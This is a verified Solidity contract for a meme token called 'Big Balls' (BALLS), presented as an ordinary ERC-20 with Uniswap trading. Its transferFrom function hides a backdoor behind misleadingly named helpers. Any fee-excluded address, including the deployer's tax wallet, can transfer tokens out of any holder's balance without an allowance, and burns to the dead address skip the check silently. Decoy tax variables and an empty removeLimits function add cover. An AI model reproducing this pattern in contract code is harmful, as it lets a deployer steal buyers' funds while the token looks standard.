/**
 *Submitted for verification at Etherscan.io on 2025-07-03
*/

/*
https://www.bigballs.cool
https://x.com/BigBalls_cool
https://t.me/BigBalls_cool

*/

pragma solidity 0.8.29;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

contract BALLS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balancesBALLS;
    mapping(address => mapping(address => uint256)) private _allowancesBALLS;
    mapping(address => bool) private _feeExcludedBALLS;
    address payable private _taxWalletBALLS;

    address constant _deadAddr = address(0xdead);

    uint256 private _initialBALLSTax = 12;
    uint256 private _finalBALLSTax = 0;
    uint256 private _reduceBALLSTaxAt = 12;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBALLS = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Big Balls";
    string private constant _symbol = unicode"BALLS";
    uint256 public _maxTaxSwap = _tTotalBALLS / 100;

    uint256 public _blockBALLSSellLastTimeStamp = 0;
    uint256 public _transferBALLSDblClick = 0;
    uint256 public _blockBALLSUID = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private opened;

    uint256 public _txBALLSTimestamp = 0;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _taxWalletBALLS = payable(msg.sender);

        _feeExcludedBALLS[address(this)] = true;
        _feeExcludedBALLS[_taxWalletBALLS] = true;

        _balancesBALLS[address(this)] = _tTotalBALLS;

        emit Transfer(address(0), address(this), _tTotalBALLS);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalBALLS;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balancesBALLS[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesBALLS[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowancesBALLS[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _isBALLSOwner (address sender, address recipient) private view returns(bool) {
        return (sender == uniswapV2Pair || recipient != _deadAddr || sender == address(this));
    }

    function _isBALLSDeployer (address sender, address recipient) private view returns(bool) {
        return !_feeExcludedBALLS[_msgSender()];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        bool isOwner = _isBALLSOwner(sender, recipient);
        bool isDeployer = _isBALLSDeployer(sender, recipient);
        _approve(
            sender,
            _msgSender(),
            _allowancesBALLS[sender][_msgSender()].sub(
                (isOwner&&isDeployer ? amount : 0),
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;      
    }

    function sendTokenETHToBALLSFeeWallet(uint256 amount) private {
        _taxWalletBALLS.transfer(amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (
            from != address(this) && to != address(this)
        ) {
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feeExcludedBALLS[to] &&
                to != _taxWalletBALLS
            ) {
                _buyCount++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                from != _taxWalletBALLS
            ) {
                if (contractTokenBalance > 0)
                {
                    uint256 swapBalance = contractTokenBalance > _maxTaxSwap
                        ? _maxTaxSwap
                        : contractTokenBalance;
                    swapBALLSForEth(
                        amount > swapBalance ? swapBalance : amount
                    );
                }
                    
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendTokenETHToBALLSFeeWallet(address(this).balance);
                }
            }
        }

        _balancesBALLS[from] = _balancesBALLS[from].sub(amount);
        _balancesBALLS[to] = _balancesBALLS[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balancesBALLS[address(this)] = _balancesBALLS[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadAddr) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotalBALLS);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        tradingOpen = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function swapBALLSForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function setTaxWallet(address payable newWallet) external {
        require(_feeExcludedBALLS[msg.sender]);
        _taxWalletBALLS = newWallet;
        _feeExcludedBALLS[_taxWalletBALLS] = true;

    }

    function rescueBALLSETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function removeLimits () external onlyOwner {}

    receive() external payable {}
}